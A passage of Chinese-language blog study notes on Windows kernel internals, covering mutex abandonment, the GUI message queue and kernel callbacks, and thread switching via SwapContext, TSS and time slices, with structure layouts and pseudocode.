class="line">正在拥有互斥体的线程</span><br></pre></td></tr></table></figure><h2 id="如何解决等待对象被遗弃问题"><a href="#如何解决等待对象被遗弃问题" class="headerlink" title="如何解决等待对象被遗弃问题"></a>如何解决等待对象被遗弃问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_KMUTANT</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 MutantListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x018 OwnerThread      : Ptr32 _KTHREAD   </span><br><span class="line">   +0x01c Abandoned        : UChar</span><br><span class="line">   +0x01d ApcDisable       : UChar</span><br><span class="line"></span><br><span class="line">MutantListEntry：</span><br><span class="line">拥有互斥体线程(KTHREAD+0x010 MutantListHead)是个链表头 圈着所有互斥体</span><br><span class="line">Abandoned：</span><br><span class="line">是否已经被放弃不用</span><br></pre></td></tr></table></figure><p>当等待对象被遗弃，系统会调用函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">MmUnloadSystemImage--&gt;KeReleaseMutant_X,Y,Abandon,Z_</span><br></pre></td></tr></table></figure><p>MmUnloadSystemImage会将Abandon设置成1（初始是0）</p><p>那么被遗弃和正常释放最后都会调用KeReleaseMutant，区分方法就是参数Abandon。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(Abandon == false) //正常调用</span><br><span class="line">&#123;</span><br><span class="line">MUTANT.Header.SignalState++;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">MUTANT.Header.SignalState == 1;</span><br><span class="line">MUTANT.OwnerThread == NULL;   </span><br><span class="line">&#125;</span><br><span class="line">if(MUTANT.Header.SignalState==1)</span><br><span class="line">MUTANT.OwnerThread == NULL;  </span><br><span class="line">从当前线程互斥体链表中将当前互斥体移除</span><br><span class="line"></span><br><span class="line">(参见KeReleaseMutant函数)</span><br></pre></td></tr></table></figure><h2 id="禁用内核APC"><a href="#禁用内核APC" class="headerlink" title="禁用内核APC"></a>禁用内核APC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">KMUTANT</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 MutantListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x018 OwnerThread      : Ptr32 _KTHREAD   </span><br><span class="line">   +0x01c Abandoned        : UChar</span><br><span class="line">   +0x01d ApcDisable       : UChar</span><br><span class="line"></span><br><span class="line">ApcDisable：</span><br><span class="line">是否禁用内核APC</span><br><span class="line"></span><br><span class="line">Mutant     对应内核函数NtCreateMutant   ApcDisable=0</span><br><span class="line">Mutex      对应内核函数NtCreateMutex    ApcDisable=1，意思是被禁止</span><br><span class="line"></span><br><span class="line">(参见KeWaitForSingleObject函数)</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - Windows事件等待机制笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 事件和互斥体 </tag>
            
            <tag> 事件等待机制 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Windows消息机制</title>
      <link href="/2018/07/06/Windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/"/>
      <url>/2018/07/06/Windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/</url>
      <content type="html"><![CDATA[<h1 id="消息队列在哪"><a href="#消息队列在哪" class="headerlink" title="消息队列在哪"></a>消息队列在哪</h1><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">进程--&gt;消息队列</span><br><span class="line">消息队列--&gt;鼠标</span><br><span class="line">消息队列--&gt;键盘</span><br><span class="line">消息队列--&gt;其他进程的消息</span><br></pre></td></tr></table></figure><h2 id="消息队列放在哪里"><a href="#消息队列放在哪里" class="headerlink" title="消息队列放在哪里"></a>消息队列放在哪里</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E6%B6%88%E6%81%AF/1.png" alt="1"></p><p>这个模式怎么区分消息属于谁，是通过一个专门进程处理消息，这样问题是有跨进程通信太费时。Windows不是这样，Linux是这样。微软是把消息队列存到了0环。<br>怎么找到消息结构体，是KThread(任何一个线程都有个内核结构体EThread，EThread第一个成员有是Kthread，Kthread有个结构体是Win32Thread，这个数据结构比较特殊，只有图形界面才有这个结构，这个结构体有消息队列)</p><h2 id="微软的解决方案：GUI线程"><a href="#微软的解决方案：GUI线程" class="headerlink" title="微软的解决方案：GUI线程"></a>微软的解决方案：GUI线程</h2><p><1> 当线程刚创建的时候，都是普通线程：<br>Win32Thread是空的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">Thread.ServiceTable--&gt;KeServiceDescriptorTable</span><br></pre></td></tr></table></figure></1></p><p><2> 当线程第一次调用Win32k.sys时，操作系统线程会调用一个函数：PsConvertToGuiThread<br>主要做几件事：   </2></p><ol><li>扩充内核栈，必须换成64KB的大内核栈，因为普通内核栈只有12KB大小。</li><li>创建一个包含消息队列的结构体，并挂到KTHREAD上。(Win32Thread指向新结构体，里有个结构体ThreadInfo，里面有个变量是MessageQueue)</li><li><p>ServiceTable服务表改变指向</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">Thread.ServiceTable--&gt;KeServiceDescriptorTableShadow</span><br></pre></td></tr></table></figure></li><li><p>把需要的内存数据映射到本进程空间</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><1> 消息队列存储在0环,通过KTHREAD.Win32Thread可以找到</1></p><p><2> 并不是所有线程都要消息队列，只有GUI线程才有消息队列</2></p><p><3> 一个GUI线程对应1个消息队列</3></p><h1 id="窗口与线程的关系"><a href="#窗口与线程的关系" class="headerlink" title="窗口与线程的关系"></a>窗口与线程的关系</h1><p>消息队列与线程的关系：一个GUI线程对应一个消息队列   </p><h2 id="消息到哪里去"><a href="#消息到哪里去" class="headerlink" title="消息到哪里去"></a>消息到哪里去</h2><p>去了当前窗口所对应的消息队列，</p><p>win32wk启动时，会启动两个线程，监控鼠标，和监控键盘的线程。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">w32k.sys中2个线程鼠标监控线程键盘监控线程--&gt;储存到对应的消息队列中</span><br></pre></td></tr></table></figure></p><p>那么鼠标监控线程怎么通过窗口，找到它的线程，然后找到消息队列呢？</p><p>通过CreateWindow跟踪，发现在0环画的。<br>窗口对象结构图有个成员，这个结构体在0环。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_WINDOW_OBJECT的结构：</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">PTHREADINFO pti;//所属线程</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>所以在某个窗口点击，鼠标监控线程知道哪个窗口，根据窗口成员，找到线程，把这个点击事件放到这个线程的消息队列里。</p><p>窗口句柄是全局的，hwnd不是地址，是0环表的索引，就是窗口句柄表。是公共的一张表，不是私有的。   </p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li><p>窗口是在0环创建的</p></li><li><p>窗口句柄是全局的</p></li><li><p>一个线程可以用多个窗口，但每个窗口只能属于一个线程</p></li></ol><h1 id="消息的接收"><a href="#消息的接收" class="headerlink" title="消息的接收"></a>消息的接收</h1><p>一个GUI线程有一个消息队列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">普通线程--&gt;GUI线程</span><br><span class="line">GUI线程--&gt;THREAD.W32THREAD</span><br><span class="line">THREAD.W32THREAD--&gt;THREADINFO</span><br><span class="line">THREADINFO--&gt;消息队列</span><br></pre></td></tr></table></figure><p>一个线程可以有多个窗口，所有窗口共享一个消息队列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">_WINDOW_OBJECT--&gt;PTHREADINFO_pti_//所属线程</span><br><span class="line">_WINDOW_OBJECT--&gt;WNDPROC_lpfnWndProc_//窗口过程即窗口回调函数</span><br></pre></td></tr></table></figure><h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E6%B6%88%E6%81%AF/2.png" alt="2"></p><h2 id="消息队列的结构"><a href="#消息队列的结构" class="headerlink" title="消息队列的结构"></a>消息队列的结构</h2><p>消息队列其实是一组，有7个   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt; SentMessagesListHead//接到SendMessage发来的消息</span><br><span class="line"></span><br><span class="line">&lt;2&gt; PostedMessagesListHead//接到PostMessage发来的消息</span><br><span class="line"></span><br><span class="line">&lt;3&gt; HardwareMessagesListHead//接到鼠标、键盘的消息</span><br><span class="line"></span><br><span class="line">...略</span><br></pre></td></tr></table></figure><h2 id="GetMessage的功能"><a href="#GetMessage的功能" class="headerlink" title="GetMessage的功能"></a>GetMessage的功能</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GetMessage( LPMSG lpMsg,//返回从队列中摘下来的消息，把取出消息放在这</span><br><span class="line">HWND hWnd,//过滤条件一：发个这个窗口的消息，取哪个窗口的消息</span><br><span class="line">UNIT wMsgFilterMin,//过滤条件</span><br><span class="line">UNIT wMsgFilterMax//过滤条件</span><br><span class="line">);</span><br><span class="line">GetMessage先看SentMessagesListHead有没有消息，有的话立马处理。即使没有Trans和Dispatch也可以处理。</span><br></pre></td></tr></table></figure><h3 id="GetMessage的主要功能："><a href="#GetMessage的主要功能：" class="headerlink" title="GetMessage的主要功能："></a>GetMessage的主要功能：</h3><p>循环判断是否有该窗口的消息，如果有，将消息存储到MSG指定的结构，并将消息从列表中删除。</p><h2 id="NtUserGetMessage的执行流程"><a href="#NtUserGetMessage的执行流程" class="headerlink" title="NtUserGetMessage的执行流程"></a>NtUserGetMessage的执行流程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">User32!GetMessage 调用 w32k!NtUserGetMessage</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//先判断SentMessagesListHead是否有消息 如果有处理掉</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">KeUserModeCallback(USER32_CALLBACK_WINDOWPROC,</span><br><span class="line">                               Arguments,</span><br><span class="line">                               ArgumentLength,</span><br><span class="line">                               &amp;ResultPointer,</span><br><span class="line">                               &amp;ResultLength);</span><br><span class="line">....</span><br><span class="line">&#125;<span class="keyword">while</span>(SentMessagesListHead != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">//以此判断其他的6个队列，里面如果有消息 返回  没有继续</span></span><br><span class="line">&#125;<span class="keyword">while</span>(其他队列!=<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><h2 id="SendMessage与PostMessage的区别-同步和异步"><a href="#SendMessage与PostMessage的区别-同步和异步" class="headerlink" title="SendMessage与PostMessage的区别(同步和异步)"></a>SendMessage与PostMessage的区别(同步和异步)</h2><p>getMessage处理完才发送SendMessage接到值，接受到的通过共享内存返回结果发送sendmessage的程序才继续，所以是同步。<br>postmessage被处理是在Transmessage   </p><h1 id="消息的分发"><a href="#消息的分发" class="headerlink" title="消息的分发"></a>消息的分发</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MSG msg;  </span><br><span class="line">while(GetMessage(&amp;msg, NULL, 0, 0))  </span><br><span class="line">&#123;  </span><br><span class="line">TranslateMessage(&amp;msg); //这个是处理键盘按键的码，转换成字符，比如有这个处理，可以用消息码WM_CHAR得到是字符,没有的话就只能用WM_KEYDOWN，得到的是asiic码。</span><br><span class="line"></span><br><span class="line">DispatchMessage(&amp;msg); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SentMessagesListHead由GetMessage()处理。  </p><h2 id="其他队列的处理流程"><a href="#其他队列的处理流程" class="headerlink" title="其他队列的处理流程"></a>其他队列的处理流程</h2><p>User32!DispatchMessage 调用 w32k!NtUserDispatchMessage</p><p><1> 根据窗口句柄找到窗口对象</1></p><p><2> 根据窗口对象得到窗口过程函数，由0环发起调用</2></p><h1 id="内核回调机制"><a href="#内核回调机制" class="headerlink" title="内核回调机制"></a>内核回调机制</h1><h2 id="还有谁调用了窗口过程"><a href="#还有谁调用了窗口过程" class="headerlink" title="还有谁调用了窗口过程"></a>还有谁调用了窗口过程</h2><p><1> GetMessage()在处理SentMessagesListHead中消息时，在0环通过KeUserCallback，实现了一个回调，调用了3换的函数。</1></p><p><2> DispatchMessage()在处理其他队列中的消息时</2></p><p><3> 内核代码，比如CreateWindow通过0环函数调用了KeUserCallback，KeUserCallback直接从0环调用3环的窗口回调。  </3></p><p>这三个都是从0环发起调用3环的函数。  </p><h2 id="KeUserModeCallback的执行流程"><a href="#KeUserModeCallback的执行流程" class="headerlink" title="KeUserModeCallback的执行流程"></a>KeUserModeCallback的执行流程</h2><p>1、从0环调用3环函数的几种方式：<br>    APC、异常、内核回调</p><p>2、凡是有窗口的程序就有可能0环直接调用3环的程序。回调机制中0环调用3环的的代码是函数：KeUserModeCallback</p><p>3、回到3环的落脚点：<br>    APC：ntdll!KiUserApcDispatcher<br>    异常：ntdll!KiUserExceptionDispatcher  </p><p>4、内核回调在3环的落脚点：</p><pre><code>PEB    +0x2C   回调函数地址表（由User32.dll提供）KeUserModeCallback函数的第一个参数就是索引</code></pre><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - Windows消息机制笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 消息机制 </tag>
            
            <tag> 内核回调机制 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>线程切换</title>
      <link href="/2018/07/05/%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2/"/>
      <url>/2018/07/05/%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2/</url>
      <content type="html"><![CDATA[<h2 id="关键结构体"><a href="#关键结构体" class="headerlink" title="关键结构体"></a>关键结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//线程结构体(仿EHREAD)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *name;<span class="comment">//线程名 相当于线程TID</span></span><br><span class="line"><span class="keyword">int</span> Flags;<span class="comment">//线程状态</span></span><br><span class="line"><span class="keyword">int</span> SleepMillisecondDot;<span class="comment">//休眠时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *InitialStack;<span class="comment">//线程堆栈起始位置</span></span><br><span class="line"><span class="keyword">void</span> *StackLimit;<span class="comment">//线程堆栈界限</span></span><br><span class="line"><span class="keyword">void</span> *KernelStack;<span class="comment">//线程堆栈当前位置,也就是ESP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *lpParameter;<span class="comment">//线程函数的参数</span></span><br><span class="line"><span class="keyword">void</span> (*func)(<span class="keyword">void</span> *lpParameter);<span class="comment">//线程函数</span></span><br><span class="line"></span><br><span class="line">&#125; GMThread_t;</span><br></pre></td></tr></table></figure><h2 id="调度链表"><a href="#调度链表" class="headerlink" title="调度链表"></a>调度链表</h2><p>//线程结构体数组<br>extern GMThread_t GMThreadList[MAXGMTHREAD];<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/2.png" alt="2"></p><p>从下标1开始，0是给当前线程用的。  </p><h2 id="初始化线程堆栈"><a href="#初始化线程堆栈" class="headerlink" title="初始化线程堆栈"></a>初始化线程堆栈</h2><p>创建完成之后，初始化堆栈<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/3.png" alt="2"></p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/4.png" alt="4"></p><h2 id="模拟线程切换总结"><a href="#模拟线程切换总结" class="headerlink" title="模拟线程切换总结"></a>模拟线程切换总结</h2><p>1)  线程不是被动切换的，而是主动让出CPU.</p><p>2)  线程切换并没有使用TSS来保存寄存器，而是使用堆栈.</p><p>3)  线程切换的过程就是堆栈切换的过程.</p><h1 id="Windows线程切换-主动切换"><a href="#Windows线程切换-主动切换" class="headerlink" title="Windows线程切换_主动切换"></a>Windows线程切换_主动切换</h1><p>在之前课程里面讲到了模拟Windows线程切换(ThreadSwitch)<br>在这个项目里面我们介绍了一个重要的函数：<br>SwitchContext<br>只有调用这个函数，就会导致线程切换<br>Windows也有类似的函数：<br>KiSwapContext</p><h2 id="KiSwapContext函数"><a href="#KiSwapContext函数" class="headerlink" title="KiSwapContext函数"></a>KiSwapContext函数</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/6.png" alt="6"></p><h2 id="SwapContext函数"><a href="#SwapContext函数" class="headerlink" title="SwapContext函数"></a>SwapContext函数</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/7.png" alt="7"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><pre><code>1) Windows中绝大部分API都调用了SwapContext函数</code></pre><p>也就是说，当线程只要调用了API，就是导致线程切换。</p><pre><code>2) 线程切换时会比较是否属于同一个进程，如果不是，切换Cr3</code></pre><p>Cr3换了，进程也就切换了。</p><h1 id="Windows线程切换-时钟中断切换"><a href="#Windows线程切换-时钟中断切换" class="headerlink" title="Windows线程切换_时钟中断切换"></a>Windows线程切换_时钟中断切换</h1><p>在上一节中我们讲过了，绝大部分系统内核函数都会调用SwapContext函数，来实现线程的切换，那么这种切换是线程主动调用的。<br>那如果当前的线程不去调用系统API，操作系统如何实现线程切换呢?</p><h2 id="如何中断一个正在执行的程序"><a href="#如何中断一个正在执行的程序" class="headerlink" title="如何中断一个正在执行的程序?"></a>如何中断一个正在执行的程序?</h2><p>1) 异常  比如缺页，或者INT N指令<br>2) 中断  比如时钟中断</p><h2 id="系统时钟"><a href="#系统时钟" class="headerlink" title="系统时钟"></a>系统时钟</h2><table><thead><tr><th>（IDT表）中断号</th><th>IRQ</th><th>说明</th></tr></thead><tbody><tr><td>0x30</td><td>IRQ0</td><td>时钟中断</td></tr></tbody></table><p>Windows系列操作系统：10 - 20 毫秒<br>如要获取当前的时钟间隔值，可使用Win32 API：<br>GetSystemTimeAdjustment</p><h2 id="时钟中断的执行流程"><a href="#时钟中断的执行流程" class="headerlink" title="时钟中断的执行流程"></a>时钟中断的执行流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">时钟中断执行流程：</span><br><span class="line"></span><br><span class="line">KiStartUnexpectedRange            HalEndSystemInterrupt</span><br><span class="line"></span><br><span class="line">KiEndUnexpectedRangeKiDispatchInterrupt</span><br><span class="line"></span><br><span class="line">KiUnexpectedInterruptTailSwapContext</span><br><span class="line"></span><br><span class="line">HalBeginSystemInterrupt</span><br></pre></td></tr></table></figure><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>线程切换的几种情况：</p><p>1)  主动调用API函数</p><p>2)  时钟中断</p><p>3)  异常处理</p><p>如果一个线程不调用API，在代码中屏蔽中断(CLI指令),并且<br>不会出现异常，那么当前线程将永久占有CPU,单核占有率<br>100%  2核就是50%</p><h1 id="时间片管理"><a href="#时间片管理" class="headerlink" title="时间片管理"></a>时间片管理</h1><p>在上面我们讲过了，时钟中断会导致线程进行切换，但并不是说只要有时钟中断就一定会切换线程，时钟中断时，两种情况会导致线程切换：</p><pre><code>1、当前的线程CPU时间片到期2、有备用线程(KPCR.PrcbData.NextThread)</code></pre><h2 id="关于CPU时间片"><a href="#关于CPU时间片" class="headerlink" title="关于CPU时间片"></a>关于CPU时间片</h2><p>1) 当一个新的线程开始执行时，初始化程序会在_KTHREAD.Quantum<br>赋初始值，该值的大小由_KPROCESS.ThreadQuantum决定<br>(观察ThreadQuantum大小)</p><p>2) 每次时钟中断会调用KeUpdateRunTime函数，该函数每次将当前线程<br>Quantum减少3个单位，如果减到0，则将KPCR.PrcbData.QuantumEnd的值<br>设置为非0。</p><p>3) KiDispatchInterrupt判断时间片到期：</p><p>调用KiQuantumEnd(重新设置时间片、找到要运行的线程) </p><h2 id="关于CPU时间片-1"><a href="#关于CPU时间片-1" class="headerlink" title="关于CPU时间片"></a>关于CPU时间片</h2><p>这个值被设置时，即使当前线程的CPU时间片没有到期，仍然会被切换.</p><p>参见KiDispatchInterrupt代码</p><h2 id="线程切换的三种情况："><a href="#线程切换的三种情况：" class="headerlink" title="线程切换的三种情况："></a>线程切换的三种情况：</h2><p>(1)、当前线程主动调用API：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">API函数--&gt;KiSwapThread</span><br><span class="line">KiSwapThread--&gt;KiSwapContext</span><br><span class="line">KiSwapContext--&gt;SwapContext</span><br></pre></td></tr></table></figure><p>(2)、当前线程时间片到期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">KiDispatchInterrupt--&gt;KiQuantumEnd</span><br><span class="line">KiQuantumEnd--&gt;SwapContext</span><br></pre></td></tr></table></figure><p>(3)、有备用线程(KPCR.PrcbData.NextThread)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">KiDispatchInterrupt--&gt;SwapContext</span><br></pre></td></tr></table></figure><h1 id="Windows线程切换-TSS"><a href="#Windows线程切换-TSS" class="headerlink" title="Windows线程切换_TSS"></a>Windows线程切换_TSS</h1><p>SwapContext这个函数是Windows线程切换的核心，无论是主动切换还是系统时钟导致的线程切换，最终都会调用这个函数。<br>在这个函数中除了切换堆栈意外，还做了很多其他的事情，了解这些细节对我们学习操作系统至关重要。</p><h2 id="内核堆栈"><a href="#内核堆栈" class="headerlink" title="内核堆栈"></a>内核堆栈</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/8.png" alt="8"></p><h2 id="内核堆栈的结构"><a href="#内核堆栈的结构" class="headerlink" title="内核堆栈的结构"></a>内核堆栈的结构</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/9.png" alt="9"></p><h2 id="Trap-Frame"><a href="#Trap-Frame" class="headerlink" title="_Trap_Frame"></a>_Trap_Frame</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/10.png" alt="10"></p><h2 id="调用API进0环"><a href="#调用API进0环" class="headerlink" title="调用API进0环"></a>调用API进0环</h2><p>普通调用：通过TSS.ESP0得到0环堆栈<br>快速调用：从MSR得到一个临时0环栈，代码执行后仍然<br>通过TSS.ESP0得到当前线程0环堆栈。  </p><h2 id="TSS"><a href="#TSS" class="headerlink" title="TSS"></a>TSS</h2><p>Intel设计TSS的目的是为了任务切换(线程切换),但Windows与Linux<br>并没有使用。而是采用堆栈来保存线程的各种寄存器。<br> 一个CPU只有一个TSS,但是线程很多，如何用一个TSS来保存所有线程的ESP0呢?<br> Tss保存的是当前线程的0环的堆栈，在线程切换时候就变了，Tss本身不切换，只是换了里面的值，找到要切换线程的栈底，放到eax，减210h是浮点寄存器，此时已经指向Trap_Frame了，又减4个单元，是为了再去除给8060的4个寄存器   </p><p> 所以Tss改了ESP0和CR3，IO权限位图（Win2000后不再使用）</p><h1 id="线程切换-FS"><a href="#线程切换-FS" class="headerlink" title="线程切换_FS"></a>线程切换_FS</h1><p>FS:[0]寄存器在3环时指向TEB,进入0环后FS:[0]指向KPCR<br>系统中同时存在很多个线程，这就意味着FS:[0]在3环时指向的TEB要有多个(每个线程一份)。<br>但在实际的使用中我们发现，当我们在3环查看不同线程的FS寄存器时，FS的段选择子都是相同的,那是如何实现通过一个FS寄存器指向多个TEB呢?<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/11.png" alt="11"></p><p>其实就是线程切换时候把基址改了。  </p><h1 id="线程切换-线程优先级"><a href="#线程切换-线程优先级" class="headerlink" title="线程切换_线程优先级"></a>线程切换_线程优先级</h1><p>(1)、当前线程主动调用API：<br>    API函数     KiSwapThread    KiSwapContext     SwapContext<br>(2)、当前线程时间片到期：<br>    KiDispatchInterrupt     KiQuantumEnd     SwapContext<br>(3)、有备用线程(KPCR.PrcbData.NextThread)<br>    KiDispatchInterrupt     SwapContext<br>    在KiSwapThread与KiQuantumEnd函数中都是通过KiFindReadyThread来找下一个要切换的线程，KiFindReadyThread是根据什么条件来选择下一个要<br>执行的线程呢?</p><h2 id="调度链表-32个"><a href="#调度链表-32个" class="headerlink" title="调度链表(32个)"></a>调度链表(32个)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KiDispatcherReadyListHead</span><br><span class="line">8055bc20  8055bc20 8055bc20 8055bc28 